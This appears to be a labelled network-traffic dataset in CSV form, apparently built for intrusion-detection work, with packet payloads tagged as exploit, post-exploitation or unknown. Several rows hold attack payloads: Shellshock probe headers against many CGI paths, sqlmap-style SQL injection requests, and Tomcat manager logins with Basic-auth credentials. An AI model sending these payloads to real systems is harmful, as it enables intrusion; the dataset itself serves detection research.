idx,s_ip,s_port,d_ip,d_port,protocol,payload,risk,class
10,40.172.144.33,13932,109.172.41.82,8080,TCP( 6 ),"GET /manager/html HTTP/1.1\r\nHost: 172.16.1.80:8080\r\nCache-Control: max-age=0\r\nAuthorization: Basic YWRtaW46MjM0NQ==\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\nCookie: JSESSIONID=188F8C229EAD4FC819679F4ECD0789CB; JSESSIONID=CC45C29586478AE7E3777E6B7681F619\r\nConnection: close\r\n\r\n",1,3_post
11,221.163.239.191,60306,31.124.255.166,80,TCP( 6 ),GET /webcgi/ruby.rb HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /webcgi/search HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /webcgi/search.cgi HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /webcgi/server.php HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /webcgi/status HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /webcgi/sysinfo.pl HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\n\r\nGET /webcgi/test HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /webcgi/test-cgi HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\n\r\nGET /webcgi/test.cgi HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /webcgi/test_cgi.php HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\n\r\nGET /webcgi/test.cgi.php HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /webcgi/test_cgi.pl HTTP/1.1\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\n\r\nGET /webcgi/test-cgi.pl HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /webcgi/test.py HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\n\r\nGET /webcgi/test.sh HTTP/1.1\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\n\r\nGET /webcgi/tmUnblock.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\n\r\nGET /webcgi/uname.cgi HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /webcgi/viewcvs.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /webcgi/welcome HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: t,1,2_exploit
12,130.106.140.55,47760,76.217.188.161,37822,TCP,......(,2,4_unknown
13,148.133.132.141,47760,194.171.76.152,57686,TCP,......(,2,4_unknown
14,192.47.198.61,47760,6.210.108.195,47876,TCP,......(,2,4_unknown
15,183.34.104.81,47760,148.110.131.154,38832,TCP,......(,2,4_unknown
16,164.171.123.12,47760,23.158.178.91,57540,TCP,......(,2,4_unknown
17,53.93.171.166,80,24.33.212.145,32970,TCP,"HTTP/1.1 403 Forbidden
Date: Thu, 28 Jul 2022 08:20:42 GMT
Server: Apache/2.4.6 (CentOS)
Last-Modified: Thu, 16 Oct 2014 13:20:58 GMT
ETag: ""1321-5058a1e728280""
Accept-Ranges: bytes
Content-Length: 4897
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN"" ""http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd""><html><head>
<meta http-equiv=""content-type"" content=""text/html; charset=UTF-8"">
..<title>Apache HTTP Server Test Page powered by CentOS</title>
..<meta http-equiv=""Content-Type"" content=""text/html; charset=UTF-8"">

    <!-- Bootstrap -->
    <link href=""/noindex/css/bootstrap.min.css"" rel=""stylesheet"">
    <link rel=""stylesheet"" href=""noindex/css/open-sans.css"" type=""text/css"" />

<style type=""text/css""><!--.. 

body {
  font-family: ""Open Sans"", Helvetica, sans-serif;
  font-weight: 100;
  color: #ccc;
  background: rgba(10, 24, 55, 1);
  font-size: 16px;
}

h2, h3, h4 {
  font-weight: 200;
}

h2 {
  font-size: 28px;
}

.jumbotron {
  margin-bottom: 0;
  color: #333;
  background: rgb(212,212,221); /* Old browsers */
  background: radial-gradient(ellipse at center top, rgba(255,255,255,1) 0%,rgba(174,174,183,1) 100%); /* W3C */
}

.jumbotron h1 {
  font-size: 128px;
  font-weight: 700;
  color: white;
  text-shadow: 0px 2px 0px #abc,
               0px 4px 10px rgba(0,0,0,0.15),
               0px 5px 2px rgba(0,0,0,0.1),
               0px 6px 30px rgba(0,0,0,0.1);
}

.jumbotron p {
  font-size: 28px;
  font-weight: 100;
}

.main {
   background: white;
   color: #234;
   border-top: 1px solid rgba(0,0,0,0.12);
   padding-top: 30px;
   padding-bottom: 40px;
}

.footer {
   border-top: 1px solid rgba(255,255,255,0.2);
   padding-top: 30px;
}

    --></style>
</head>
<body>
  <div class=""jumbotron text-center"">
    <div class=""container"">
   .  <h1>Testing 123..</h1>
  ..<p class=""lead"">This page is used to test the proper operation of the <a href=""http://apache.org"">Apache HTTP server</a> after it has been installed. If you can read this page it means that this site is working properly. This server is powered by <a href=""http://centos.org"">CentOS</a>.</p>
..</div>
  </div>
  <div class=""main"">
    <div class=""container"">
       <div class=""row"">
  ...<div class=""col-sm-6"">
    ...<h2>Just visiting?</h2>
...  ..<p class=""lead"">The website you just visited is either experiencing problems or is undergoing routine maintenance.</p>
  .....<p>If you would like to let the administrators of this website know that you've seen this page instead of the page you expected, you should send them e-mail. In general, mail sent to the name ""webmaster"" and directed to the website's domain should reach the appropriate person.</p>
  .....<p>For example, if you experienced problems while visiting www.example.com, you should send e-mail to ""webmaster@example.com"".</p>
.  ...</div>
  ....<div class=""col-s",2,2_exploit
18,49.105.126.181,47760,45.106.239.154,48866,TCP,......(,2,4_unknown
19,173.215.87.28,50128,32.68.127.219,5985,TCP( 6 ),"POST /wsman?PSVersion=7.1.3 HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: application/soap+xml;charset=UTF-8\r\nAuthorization: Negotiate TlRMTVNTUAABAAAAt4II4gAAAAAAAAAAAAAAAAAAAAAKADk4AAAADw==\r\nUser-Agent: Microsoft WinRM Client\r\nContent-Length: 0\r\nHost: 172.16.1.71:5985\r\n\r\nPOST /wsman?PSVersion=7.1.3 HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: multipart/encrypted;protocol=\""application/HTTP-SPNEGO-session-encrypted\"";boundary=\""Encrypted Boundary\""\r\nAuthorization: Negotiate TlRMTVNTUAADAAAAGAAYAIgAAAAAAQABoAAAABYAFgBYAAAACgAKAG4AAAAQABAAeAAAABAAEACgAQAANYKI4goAOTgAAAAPAEEKAQL71ouZz5ojuYCPtTEANwAyAC4AMQA2AC4AMQAuADcAMQBpAGcAbABvAG8AQQBUAFQAQQBDAEsARQBSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOa2BltmPNi+oRmjmLVeLq4BAQAAAAAAANigLua2g9cBaviGGV554vQAAAAAAgAOAFYASQBDAFQASQBNADIAAQAOAFYASQBDAFQASQBNADIABAAOAHYAaQBjAHQAaQBtADIAAwAOAHYAaQBjAHQAaQBtADIABwAIANigLua2g9cBBgAEAAIAAAAIADAAMAAAAAAAAAAAAAAAADAAAOIrTWDdFGlfMqPpjiaY4+FabUPNFVZe2YypIlB657YgCgAQAAAAAAAAAAAAAAAAAAAAAAAJACAASABUAFQAUAAvADEANwAyAC4AMQA2AC4AMQAuADcAMQAAAAAAAAAAAAAAAADNidASnoURrtINk6j+PttU\r\nUser-Agent: Microsoft WinRM Client\r\nContent-Length: 5350\r\nHost: 172.16.1.71:5985\r\n\r\n--Encrypted Boundary\r\nContent-Type: application/HTTP-SPNEGO-session-encrypted\r\nOriginalContent: type=application/soap+xml;charset=UTF-8;Length=5095\r\n--Encrypted Boundary\r\nContent-Type: application/octet-stream\r\n........K22O.U......g....h.... 4......7..\n.....ei........y{.\n.r..T.}..O...........yz...\n..o...j......^..{\\...a.>..+.%:.U.d/..8..qv}.`Q/.aS*..\\.W........Q........{.P)...{.oUi.....I....RgZP`.\n,..c .......^.;..~..B?.Y.+.......jK....rs+Uw&...KE.j......6..G.nc.}.p.(......-<...C....@\n~....I.as...t.!,\"".W'y.]>!..,..2k......D...Jw.....p....@.6s..u{xl......!..%T.7K..*. ...B...:......-w.a=....UF......6....#=.vx.F.:....2.....!......|L.#...8.U.G.....}~.S..].b....P...G.j.4...iM......j.GD&.....eX.)....=..z....w{.F.a...\\...../....N..u..X..)......0.B.%~....x/x..f.....p..'...I?Q.L.qLQ*O.5...\r8..x...e..dW....n.......%......v....C..;.&r/..6/..N.........xZ...*.?...?...&h...vK..@....S.Fy.........qV.....N{..Y,....F.n.7.\r...a.`....^...jqCx.t.....<...PO[`.q-.....}....=y.u.......iiC.V.J..MY.Ac.!X..A~.;W...B....lil...#.m.X.O.3......$.}..!....&.\n4r...uT.E2.A.U...H......4.8IN.e..b!..4.).bs._..........J\r.[uIx..j4..,l~.\\r........W...l!..f.....n....z,w@(.1..W.a.!;.|.J.....1...R..=@..'(...w....D.k.....B...i.....f..i.. S..R..;._.Qv[.1...`...6A=..z`.'.;l..Y.@.....)....'.y....AQ<...Y!..h...G+t..@u......(.a..K3...I....H.b.w&Y/...G?.a..c...........c7I)0/\n..I......U...`....%..b..43_.c...Rz..._6..i..l.v.\na.E......!.=........)..SQ.t......Q!x...5;V@[I....4.Z+h.{.nl.$I.q.......p.$.\""&.....~.....L.....+.f2..|..x......S.(.!:k..VK(..y+....>\\.\"".\\%M[V...o.hw.>m.oI3.I.............$..!pR]>KLJFc....P......K....-%...,v.....`.....w.....E..\""..sv...\n:..{T(R.2..T.y@\n...|*.B...ef.g.....Ir.!\""..?.{%2h......b....K.......t'|.......I...=..*....y!zu......I..b/Z<.K.5.5{.....;[.|....a......\\..s...!..*F....y..5x....+.._Z...d..=2....D.....l<..wr.q..C...5$3..9FP...N.....e.lT.+9O.Z+....T.Mt.!#...G....,\rr....).G...l/.......x.N....'[....nU...)...k..g.)l.l....../..\\..&......''......+.L.dy..2.......7VV#f`........*....E.T~fm........{+s<........@.|x..6./..... ..:(.0.d.....;.d.........].....l.g...^)../t.......=.Lw....S8..B.O..m]3A...0...65...uO.....KK.........N..Z..!..dX.F.xt..r........%.2...../..9.P...a.....CK../..D.W...z..qH.r).=..X0..T..~.....S._T.......\\K.i..K[P1 uZ(.[.../k...H.....U~...2..p.L...C{....d.T.......qQ...G..._..&....M{\n......Q.\r....M...T...d.bQ7.@x'......%`f...l.9..._........8.)[.,..-.....x.b..P...._...3:z.)......._..D...w..T...5...g....ySw..pr..P..E.....`> ..;...*.#|.;-i@.:.....Y.*.N.&v7.\\^g4kIs..>1(.$yC.R...O.p..).r\r.E!2.9)V;=..W>.gIM.......2...5I..`,N;.......c..R....r).qH.....m...B.O)...sA.u...y.?$...G....!.R..O..#...d..q......;H..A..)..u.|?../Z..p.)V.B....'l.K$.{a>...}{..t?..iq..._.`.!.s.\n..6...t..7...Qy.4.K....\nM.J...:..>.C.......-yjN.3DVJ.1......;.L.DhSsa...V.|..r..._Af.(N.U....k._~!9....c..).^....H4..&...A.A....w....L.%7.5R.b.(P...2E>_@.gL.b.9.$.2?..)5......IE........}.X+.5x.n..;..J.R..v'..7.9A8N.m.....m#.Z..<\\..\"".\r..7..IE....#p..l...Px...L.G7..",2,3_post
20,151.90.133.204,47760,148.149.63.209,37132,TCP,......(,2,4_unknown
21,64.70.43.131,36590,96.169.205.134,80,TCP( 6 ),GET /cgi-bin-sdb/login.pl HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /cgi-bin-sdb/pathtest.pl HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /cgi-bin-sdb/php HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\n\r\nGET /cgi-bin-sdb/php4 HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /cgi-bin-sdb/php5 HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /cgi-bin-sdb/php-cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\n\r\nGET /cgi-bin-sdb/php.cgi HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\n\r\nGET /cgi-bin-sdb/php.fcgi HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /cgi-bin-sdb/printenv HTTP/1.1\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\n\r\nGET /cgi-bin-sdb/restore_config.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /cgi-bin-sdb/ruby.rb HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /cgi-bin-sdb/search HTTP/1.1\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\n\r\nGET /cgi-bin-sdb/search.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /cgi-bin-sdb/server.php HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\n\r\nGET /cgi-bin-sdb/status HTTP/1.1\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\n\r\nGET /cgi-bin-sdb/sysinfo.pl HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\n\r\nGET /cgi-bin-sdb/test HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /cgi-bin-sdb/test-cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\n\r\nGET /cgi-bin-s,1,2_exploit
22,156.127.162.161,47760,147.232.56.211,33928,TCP,......(,2,4_unknown
23,110.128.209.195,60058,165.141.103.152,33035,UDP( 17 ),CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC,2,4_unknown
24,202.131.7.70,3389,108.28.99.220,49324,TCP( 6 ),.........4.........,3,3_post
25,136.128.17.185,80,140.1.106.82,59002,TCP,"HTTP/1.1 403 Forbidden
Date: Thu, 28 Jul 2022 08:20:35 GMT
Server: Apache/2.4.6 (CentOS)
Last-Modified: Thu, 16 Oct 2014 13:20:58 GMT
ETag: ""1321-5058a1e728280""
Accept-Ranges: bytes
Content-Length: 4897
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN"" ""http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd""><html><head>
<meta http-equiv=""content-type"" content=""text/html; charset=UTF-8"">
..<title>Apache HTTP Server Test Page powered by CentOS</title>
..<meta http-equiv=""Content-Type"" content=""text/html; charset=UTF-8"">

    <!-- Bootstrap -->
    <link href=""/noindex/css/bootstrap.min.css"" rel=""stylesheet"">
    <link rel=""stylesheet"" href=""noindex/css/open-sans.css"" type=""text/css"" />

<style type=""text/css""><!--.. 

body {
  font-family: ""Open Sans"", Helvetica, sans-serif;
  font-weight: 100;
  color: #ccc;
  background: rgba(10, 24, 55, 1);
  font-size: 16px;
}

h2, h3, h4 {
  font-weight: 200;
}

h2 {
  font-size: 28px;
}

.jumbotron {
  margin-bottom: 0;
  color: #333;
  background: rgb(212,212,221); /* Old browsers */
  background: radial-gradient(ellipse at center top, rgba(255,255,255,1) 0%,rgba(174,174,183,1) 100%); /* W3C */
}

.jumbotron h1 {
  font-size: 128px;
  font-weight: 700;
  color: white;
  text-shadow: 0px 2px 0px #abc,
               0px 4px 10px rgba(0,0,0,0.15),
               0px 5px 2px rgba(0,0,0,0.1),
               0px 6px 30px rgba(0,0,0,0",2,2_exploit
26,53.113.140.179,43458,13.207.112.101,80,TCP( 6 ),"GET /vulnerabilities/sqli/?id=1&Submit=Submit%27%20AND%208016%3D%28SELECT%208016%20FROM%20PG_SLEEP%285%29%29%20AND%20%27JSVR%27%3D%27JSVR HTTP/1.1\r\nCache-Control: no-cache\r\nCookie: PHPSESSID=qplh0gknlcq19vk0flovac8il1; security=low\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; sk; rv:1.9.0.5) Gecko/2008121621 Ubuntu/8.04 (hardy) Firefox/3.0.5\r\nHost: 172.16.1.50\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close\r\n\r\n",1,2_exploit
27,208.93.142.132,47760,214.213.76.142,55020,TCP,......(,2,4_unknown
28,53.32.155.88,34698,34.17.59.138,80,TCP( 6 ),"GET /vulnerabilities/sqli/?id=1&Submit=Submit%29%20AND%202485%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%282485%3D2485%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%284524%3D4524 HTTP/1.1\r\nCache-Control: no-cache\r\nCookie: PHPSESSID=qplh0gknlcq19vk0flovac8il1; security=low\r\nUser-Agent: Mozilla/4.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.7) Gecko/2008398325 Firefox/3.1.4\r\nHost: 172.16.1.50\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close\r\n\r\n",1,2_exploit
29,85.38.113.82,47760,104.202.202.179,51502,TCP,......(,2,4_unknown
30,1.174.72.200,35070,1.247.28.195,80,TCP,"GET /?id=-4732%27%29%29%29%20UNION%20ALL%20SELECT%203012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%2C3012%23 HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.3.4#stable (http://sqlmap.org)
Host: 192.168.136.132
Referer: http://192.168.136.132:80
Cache-Control: no-cache

",1,2_exploit
31,47.153.110.234,26200,4.3.146.57,8080,TCP( 6 ),"GET /manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=2DB51B70DF17EEE27863DBC19BBBA14A HTTP/1.1\r\nHost: 172.16.1.80:8080\r\nCache-Control: max-age=0\r\nAuthorization: Basic dG9tY2F0OmdvdGhpYw==\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\nCookie: JSESSIONID=F0D2FDE2E733CA90854182CA10BDC92C; JSESSIONID=6FB022130137336ED0BA1F4197B17BC0\r\nConnection: close\r\n\r\n",1,3_post
